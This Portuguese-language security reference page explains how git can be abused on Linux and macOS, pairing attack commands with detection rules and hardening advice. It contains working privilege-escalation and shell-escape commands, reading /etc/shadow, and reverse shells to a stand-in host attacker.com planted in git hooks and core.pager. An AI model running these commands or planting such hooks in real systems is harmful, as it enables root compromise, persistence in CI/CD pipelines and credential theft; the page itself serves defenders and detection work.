# git

**Plataforma:** Linux / macOS

**Categorias:** Execução de código, Shell escape, Escalada de privilégios (sudo)

**MITRE ATT&CK:** T1059.004 (Unix Shell), T1548.001 (SUID/SGID)

**Referência ofensiva:** https://gtfobins.org/gtfobins/git/

---

## O que é o git

O git é o sistema de controle de versão distribuído mais usado no mundo. Está presente em praticamente todo servidor de desenvolvimento, máquina de CI/CD e estação de trabalho de desenvolvedor. Além do controle de versão, o git tem suporte a hooks (scripts executados automaticamente em resposta a eventos) e ao comando `git help`, que abre um paginador de texto — normalmente o `less` ou `man`.

É exatamente essa capacidade de abrir um paginador e executar hooks que o torna relevante do ponto de vista de segurança.

---

## Por que atacantes usam o git

O git aparece principalmente em dois cenários: escalada de privilégios quando configurado incorretamente no sudoers, e escape de ambientes restritos que permitem o uso do git mas não de outros comandos. Em ambientes de desenvolvimento onde o git tem permissão de sudo para pull/push de repositórios corporativos, a técnica de escape via paginador é direta.

---

## Técnicas de abuso

### Escalada de privilégios via sudo e paginador

O git usa um paginador (geralmente `less`) para exibir saída de comandos como `git log`, `git diff` e `git help`. Se o git pode ser executado via sudo, o paginador abre com privilégios de root, e dentro do `less` é possível executar comandos via `!`:

```bash
# Se sudoers: user ALL=(ALL) NOPASSWD: /usr/bin/git
sudo git -p help config
# Dentro do paginador (less), digitar:
!/bin/bash

# Alternativa forçando o uso do paginador
sudo git log --all --oneline | less
# Dentro do less: !/bin/bash

# Definir o paginador diretamente como bash
sudo GIT_PAGER='/bin/bash -p' git -p help

# Via variável de ambiente PAGER
sudo PAGER='bash -p' git -p help
```

### Escape de ambiente restrito via editor de commit

O git abre um editor de texto (geralmente vim ou nano) ao criar commits. Se o git está disponível em um ambiente restrito, a abertura do editor pode ser usada para escape:

```bash
# Criar commit em repositório temporário — abre o editor configurado
mkdir /tmp/repo && cd /tmp/repo && git init && git commit --allow-empty -m "x"
# Se o editor for vim: :!/bin/bash

# Forçar o uso de vim como editor
GIT_EDITOR=vim git commit --allow-empty
# Dentro do vim: :!/bin/bash
```

### Execução via git hooks

Os hooks do git são scripts executados automaticamente em resposta a eventos (pre-commit, post-commit, pre-push, etc.). Se um atacante tem escrita no diretório `.git/hooks/` de um repositório, pode injetar código que será executado quando qualquer usuário (ou processo de CI/CD) executar operações git nesse repositório.

```bash
# Criar hook malicioso em repositório comprometido
echo '#!/bin/bash' > /opt/projeto/.git/hooks/pre-commit
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /opt/projeto/.git/hooks/pre-commit
chmod +x /opt/projeto/.git/hooks/pre-commit

# O hook dispara quando qualquer usuário fizer git commit no repositório
# Se o repositório é usado por um pipeline de CI/CD rodando como root, a execução é root
```

### Execução via git config core.editor e core.pager

```bash
# Configurar editor malicioso que executa ao abrir commit
git config core.editor "/bin/bash -p"
git commit --amend

# Configurar paginador malicioso
git config core.pager 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"'
git log
```

### Leitura de arquivos via git diff

```bash
# Com sudo, ler conteúdo de arquivo como diff contra /dev/null
sudo git diff --no-index /dev/null /etc/shadow
```

---

## Técnicas de bypass e evasão

### Uso de variáveis de ambiente para evitar argumentos suspeitos

```bash
# Em vez de --pager explícito, definir via variável de ambiente
sudo GIT_PAGER='/bin/bash' git log
sudo GIT_EDITOR='bash' git commit --amend
```

### Hook em repositório de terceiros clonado

```bash
# Clonar repositório legítimo e adicionar hook antes de usuário executar operações
git clone https://github.com/projeto/repo.git
echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1' > repo/.git/hooks/post-checkout
chmod +x repo/.git/hooks/post-checkout
# Quando o dono do repositório fizer git checkout, o hook dispara
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- git executado via sudo, especialmente com `-p` (paginador forçado) ou `help`
- Criação ou modificação de arquivos em `.git/hooks/` em repositórios de produção ou CI/CD
- Variáveis de ambiente `GIT_PAGER` ou `GIT_EDITOR` definidas com valores de shell ou interpretador
- git iniciando processo filho `/bin/bash` ou `/bin/sh` como resultado de paginador

**Indicadores de média relevância:**

- git diff com `/dev/null` como primeiro argumento e arquivo sensível como segundo
- git executado por processo filho de servidor web ou daemon

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0101-gtfobins_execution.xml -->

<!-- git com -p (paginador) via sudo — escape via less -->
<rule id="100243" level="13">
  <if_group>auditd</if_group>
  <field name="audit.command">git</field>
  <field name="audit.execve" type="pcre2">\s-p\s|--paginate</field>
  <field name="audit.uid" type="pcre2">^0$</field>
  <description>git com paginador forcado executado como root — possivel escape via less/pager</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>

<!-- Modificação de arquivos em .git/hooks -->
<rule id="100244" level="12">
  <if_group>auditd</if_group>
  <field name="audit.file.name" type="pcre2">\.git/hooks/(pre-commit|post-commit|pre-push|post-checkout|pre-receive|update)</field>
  <field name="audit.syscall" type="pcre2">open|write|rename</field>
  <description>Modificacao de git hook em repositorio — possivel injecao de codigo em pipeline de CI/CD</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Desenvolvedores criando hooks legítimos:** hooks de pre-commit para linting, formatação de código e verificação de secrets são práticas comuns e legítimas. O indicador relevante é a criação de hooks em repositórios de produção ou por usuários que não são os mantenedores do repositório.

**Scripts de CI/CD:** pipelines que configuram hooks automaticamente são comuns. Filtre por usuário de serviço do CI e por conteúdo do hook (hooks legítimos raramente contêm conexões de rede ou invocações de shell interativo).

---

## Proteção e controles defensivos

**Não incluir git no sudoers sem necessidade:** qualquer entrada de sudoers que permita `git` sem restrições de argumento equivale a sudo root. Se há necessidade de git com sudo, restrinja com `NOEXEC` tag e apenas para operações específicas como `git pull`.

**Monitorar hooks em repositórios críticos:** implemente verificação automática de integridade dos hooks em repositórios de produção e CI/CD. Uma soma de verificação ou assinatura dos hooks legítimos detecta modificações não autorizadas.

**Safe directories e verificação de ownership:** o git 2.35.2+ introduziu proteção contra repositórios em diretórios pertencentes a outro usuário (`safe.directory`). Mantenha o git atualizado para se beneficiar dessas proteções.

---

## Referências

- GTFOBins — git: https://gtfobins.org/gtfobins/git/
- MITRE ATT&CK T1059.004: https://attack.mitre.org/techniques/T1059/004/
